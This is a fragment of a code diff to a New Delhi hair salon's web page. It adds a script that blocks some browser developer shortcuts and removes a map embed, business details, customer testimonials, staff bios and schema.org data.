+                    (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                }
+            }
+        });
     </script>
-    <!-- Google Maps iframe -->
-<div style="width:100%;height:320px;border-radius:8px;overflow:hidden;margin-top:8px">
-  <iframe width="100%" height="320" frameborder="0" style="border:0"
-    src="https://www.google.com/maps?q=New%20Delhi%2C%20India&output=embed" allowfullscreen></iframe>
-</div>
-<section class="card" style="margin-top:18px">
-  <h3>Business details & verification</h3>
-  <p style="color:#6b7280">Owner: <strong>Meera Kenchi</strong><br>
-  Established: <strong>2018</strong><br>
-  Trade Licence / Registration: <strong>DL-KENCHI-2021-09</strong></p>
-  <p style="color:#6b7280">If you have a scanned licence, upload it to your host and replace <code>license.jpg</code> with the scan.</p>
-  <img src="license.jpg" alt="Business registration (replace)" style="width:100%;border-radius:8px;margin-top:8px">
-</section>
-<blockquote>“Amazing colour work and attention to detail — my hair has never looked better.” — Priya S., Lajpat Nagar (Aug 2024)</blockquote>
-<blockquote>“Very friendly staff, hygienic salon and great styling. Highly recommended.” — Rahul M., Defence Colony (Mar 2025)</blockquote>
-<blockquote>“Quick appointment, lovely bridal blowout for my wedding — they nailed it.” — Neha K., Greater Kailash (Dec 2024)</blockquote>
-<p><strong>Meera Kenchi</strong> — Founder & Master Colourist — 12+ years experience, trained with international colourists.</p>
-<p><strong>Rohan Singh</strong> — Senior Stylist — 6+ years, specialist in precision cuts and men’s grooming.</p>
-<script type="application/ld+json">
-{
-  "@context":"https://schema.org",
-  "@type":"BeautySalon",
-  "name":"Kenchi Salon",
-  "url":"https://kenchi-salon.netlify.app",
-  "telephone":"+919910170356",
-  "address":{
-    "@type":"PostalAddress",
-    "streetAddress":"Kenchi Salon, New Delhi",
-    "addressLocality":"New Delhi",
-    "addressCountry":"IN"
-  },
-  "openingHours":"Mo-Sa 10:00-20:00, Su 11:00-18:00",
-  "description":"Kenchi Salon — professional haircuts, colouring, keratin & styling in New Delhi."
-}
-</script>
-
 </body>
 </html>
